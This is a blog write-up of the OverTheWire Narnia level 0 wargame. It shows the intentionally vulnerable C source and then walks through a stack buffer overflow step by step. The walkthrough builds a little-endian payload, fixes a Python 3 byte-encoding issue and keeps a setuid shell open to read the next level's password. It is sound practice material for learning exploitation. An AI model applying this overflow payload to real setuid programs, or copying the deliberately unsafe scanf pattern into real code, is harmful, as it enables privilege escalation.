---
layout: post
title: OverTheWire - narnia0
date: 2025-04-05
categories:
  - blog
tags:
  - ctf
  - overthewire
  - ssh
  - binary
  - exploitation
excerpt: ""
---
## OverTheWire - narnia0

The Narnia wargames at overthewire.org are designed to help learn basic exploitation techniques. Each level has a binary to exploit, and to make it a bit easier to figure out, the source code is also provided.

### Source for `narnia0.c` (comments added are mine):

```C
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];  // The buffer is 20 characters long

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s", &buf);  // The input can be a string of up to 24 characters, allowing overflow

    printf("buf: %s\n", buf);
    printf("val: 0x%08x\n", val);

    if(val==0xdeadbeef){
        setreuid(geteuid(), geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

Because it's good practice, I like to inspect the binary before executing it:

```sh
narnia0@gibson:/narnia$ file narnia0
narnia0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=72a26cf43f94583cf00e006c1282660780c35766, for GNU/Linux 3.2.0, not stripped
```

### Initial Execution:

```
narnia0@gibson:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: 123456789
buf: 123456789
val: 0x41414141
WAY OFF!!!!
```

It looks like this is a buffer overflow attack. The goal is to overwrite `val` with `0xdeadbeef`. Since `buf` is allocated 20 characters, we can test this by filling it with 20 characters:

```
narnia0@gibson:/narnia$ python3 -c 'print("B" * 20)' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBB
val: 0x41414100
WAY OFF!!!!
```

Just to confirm how far the overflow reaches, I tested with 22 and 24 characters:

```
narnia0@gibson:/narnia$ python3 -c 'print("B" * 22)' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBB
val: 0x41004242
WAY OFF!!!!
narnia0@gibson:/narnia$ python3 -c 'print("B" * 24)' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBBBB
val: 0x42424242
WAY OFF!!!!
```

Now I know exactly how many characters it takes to overwrite `val`. The next step is to craft a payload that places `0xdeadbeef` in the correct location. Since this system uses little-endian byte order, we need to reverse the byte sequence: `0xdeadbeef => de ad be ef => ef be ad de => \xef\xbe\xad\xde`

The command:

```sh
python3 -c 'print("A" * 20 + "\xef\xbe\xad\xde")' | ./narnia0
```

### Unexpected Issue:

```
narnia0@gibson:/narnia$ python3 -c 'print("B" * 20 + "\xef\xbe\xad\xde")' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBï¾
val: 0xbec2afc3
WAY OFF!!!!
```

Hmmm... `val` changed, but not to `0xdeadbeef`. This stumped me for a while. I suspected `print()` was adding an unintended character, so I tried:

```sh
python3 -c 'print("A" * 20 + "\xef\xbe\xad\xde", end="")'
```

but it didn't change the output.

### Debugging and Solution:

During my research, I found that a similar exploit worked using Perl:

```
narnia0@gibson:/narnia$ perl -e 'print "B"x20 . "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
val: 0xdeadbeef
```

That worked! So why didn’t my Python command?

It boils down to string encoding differences:

- **Perl** treats `"\xef\xbe\xad\xde"` as raw bytes, sending them exactly as written.
- **Python 3** treats strings as Unicode by default, so `print()` encodes non-ASCII characters in UTF-8, altering the byte sequence.

The fix was to use `sys.stdout.buffer.write()` to ensure raw bytes were written correctly:

```
narnia0@gibson:/narnia$ python3 -c 'import sys; sys.stdout.buffer.write(b"B" * 20 + b"\xef\xbe\xad\xde")' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
val: 0xdeadbeef
```

### Getting the Shell:

The "WAY OFF!!!!" message was gone, but I still didn’t see a shell prompt. It turns out `/bin/sh` needs interactive input to remain open. Running the exploit with `cat` kept it from immediately closing:

```
narnia0@gibson:/narnia$ (python3 -c 'import sys; sys.stdout.buffer.write(b"B" * 20 + b"\xef\xbe\xad\xde")'; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
[REDACTED]
```

Success! I now have `narnia1` privileges and retrieved the password for the next level.